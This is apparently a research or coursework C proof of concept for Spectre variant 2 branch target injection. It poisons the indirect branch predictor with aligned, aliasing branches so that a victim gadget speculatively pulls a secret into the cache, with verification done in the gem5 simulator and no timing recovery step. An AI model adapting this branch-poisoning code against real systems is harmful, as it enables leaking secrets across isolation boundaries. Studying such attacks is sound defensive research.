#include <unistd.h>
#include <x86intrin.h> /* for rdtscp and clflush */

#include "repeat.h"
#include "victim.h"

/* Gives this program access to ebx */
register void *ebx __asm("rbx");

/* How many iterations to run the branch poisoning */
const int poison_iterations = 10;

/* Some schenanigans to get the indirect branch aligned the way we want */
void alignment_dummy(void) __attribute__ ((aligned(256)));
void alignment_dummy(void) {
    /* The GCC attribute ensures that the start of this function is
     * aligned on a 256-byte boundary */
    /* Repeat this one-byte NOP the number of times needed to align
     * the two indirect branches.
     *
     * First, find the address of the target branch and its set number
     * (addr >> 2 & 0xFF). For me, this is a callq *%rax at 0x40118f,
     * set 99.
     *
     * Second, compile with the macro below as REPEAT_0 and find the
     * set of the attack indirect branch. For me, 0x40122f, set 139
     *
     * Third, compute (target set - attack set) % 256. Set the macro
     * to repeat that many times.
     *
     */
    REPEAT_223( \
    __asm("xchg %rax, %rax"); \
    __asm("xchg %rax, %rax"); \
    __asm("xchg %rax, %rax"); \
    __asm("xchg %rax, %rax"); \
    );
}

/* Poison the indirect branch predictor so that  */
void poison_branch(void) {
    /* In a real attack, the attacker and victim would be in different
     * address spaces, so this would be slightly more complicated. If
     * the address of the gadget were in kernel-space, we could
     * install a segfault handler, otherwise we could ensure some
     * dummy function was present in the attacker's address space at
     * the gadget's address. */
    cmp_func_t *target = (cmp_func_t *)&gadget;

    /* Pass input to the gadget, so we don't have to deal with a
     * segfault handler */
    int temp = 0;
    ebx = (void *)&temp;

    /* For the poisoning to work, this indirect branch must alias (in
     * the branch predictor) to the same entry as the victim indirect
     * branch. */
    (*target)(0, 0);
}

int main(void) {
    /* Flush secret from the cache */
    _mm_clflush(secret);

    /* Poison the target branch */
    for (int i = 0; i < poison_iterations; i++) {
        poison_branch();
    }

    /* Pass input to the gadget */
    ebx = (void *)secret;

    /* Perform a good call */
    victim_entry(&example_cmp);

    /* This is where we'd perform a cache timing attack to recover the
     * the secret, but we're using gem5 to snoop the cache explicitly */

    /* Check to see if secret made it into the cache */
    char a = *secret;
    (void)a;

    return 0;
}
